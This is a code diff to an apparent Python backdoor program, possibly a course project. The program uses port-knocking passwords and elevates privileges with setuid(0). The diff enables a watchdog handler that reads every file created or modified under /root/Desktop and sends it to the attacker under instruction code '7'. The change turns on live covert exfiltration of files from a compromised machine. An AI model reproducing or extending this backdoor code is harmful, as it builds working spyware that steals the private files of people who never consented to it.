@@ -52,6 +52,7 @@ class Configuration:
         self.port_knock_password_base = ''
         self.port_knock_password_seq_num = ''
         self.delimiter = ''
+        self.storage_path = ''
 
         with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
             fp = [line.rstrip('\n') for line in file]
@@ -82,6 +83,8 @@ class Configuration:
                     self.port_knock_password_seq_num = config_data[1]
                 elif config_data[0] == 'delimiter':
                     self.delimiter = config_data[1]
+                elif config_data[0] == 'storage_path':
+                    self.storage_path = config_data[1]
 
     def update_port_knock_password_seq_num(self):
         self.port_knock_password_seq_num = str(int(self.port_knock_password_seq_num) + 1)
@@ -148,10 +151,10 @@ def start_backdoor():
     :return: None
     """
     print("Starting Receiver.")
-    start_watching_directory("data")
-    c = input()
+    start_watching_directory("/root/Desktop/write_test")
+    u = input()
     stop_watching_directory()
-    g = input()
+    return
 
     # Elevate privileges.
     setuid(0)
@@ -395,12 +398,12 @@ def send_message(message, instruction, filename=""):
 
 
 
-def on_created(event):
-    print("created")
-
-def on_modified(event):
-    print("modified")
-    print(event)
+# def on_created(event):
+#     print("created")
+#
+# def on_modified(event):
+#     print("modified")
+#     print(event)
 
 class OnMyWatch:
     def __init__(self, directory_path, is_recursive=True):
@@ -413,15 +416,15 @@ class OnMyWatch:
         self.watch_directory = new_path
 
     def run(self):
-        # event_handler = Handler()
-        event_handler = FileSystemEventHandler()
-        event_handler.on_modified = on_modified
-        event_handler.on_created = on_created
+        event_handler = Handler()
+        # event_handler = FileSystemEventHandler()
+        # event_handler.on_modified = on_modified
+        # event_handler.on_created = on_created
         self.observer.schedule(event_handler, self.watch_directory, recursive=self.is_recursive)
         self.observer.start()
         try:
             while True:
-                time.sleep(5)
+                time.sleep(60)
         except:
             self.observer.stop()
             print("Observer Stopped")
@@ -443,33 +446,30 @@ class Handler(FileSystemEventHandler):
             # Event is created, you can process it now
             print("Watchdog received created event - % s." % event.src_path)
             print(event.src_path)
-            # binary_file, file_name = get_file_binary(event.src_path)
-            # send_message(binary_file, "7", file_name)
+            binary_file, file_name = get_file_binary(event.src_path)
+            send_message(binary_file, "7", file_name)
             # "7" to match the watch a directory instruction sent by attacker
         elif event.event_type == 'modified':
             # Event is modified, you can process it now
             print("Watchdog received modified event - % s." % event.src_path)
             print(event.src_path)
-            # binary_file, file_name = get_file_binary(event.src_path)
-            # send_message(binary_file, "7", file_name)
+            binary_file, file_name = get_file_binary(event.src_path)
+            send_message(binary_file, "7", file_name)
             # "7" to match the watch a directory instruction sent by attacker
 
 
 directory_watch_active = False
-directory_path = "data"
-watch = OnMyWatch(directory_path)
+watch = OnMyWatch("/root/Desktop")
 
 
-def start_watching_directory(new_directory_path):
+def start_watching_directory(directory_path):
     global watch
     global directory_watch_active
-    global directory_path
     if directory_watch_active:
-        print(f"Already watching directory {directory_path}")
+        print(f"Already watching directory {watch.watch_directory}")
         return
 
     directory_watch_active = True
-    directory_path = new_directory_path
     watch.set_path(directory_path)
 
     watch.run()
@@ -486,7 +486,7 @@ def stop_watching_directory():
 
     watch.stop()
     directory_watch_active = False
-    print(f"Directory watch stopped: {directory_path}")
+    print(f"Directory watch stopped: {watch.watch_directory}")
     return
 
 
